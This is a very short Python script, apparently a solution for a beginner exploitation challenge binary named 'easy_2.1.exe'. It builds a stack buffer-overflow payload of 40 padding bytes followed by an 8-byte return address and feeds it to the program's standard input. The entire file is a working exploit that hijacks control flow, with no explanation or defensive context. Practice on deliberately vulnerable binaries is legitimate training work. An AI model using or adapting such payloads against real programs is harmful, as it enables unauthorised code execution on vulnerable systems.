from subprocess import PIPE, Popen

payload = b"a"*40 + b"\x74\x13\x6B\x1B\xF7\x7F\x00\x00"

p1 = Popen("easy_2.1.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()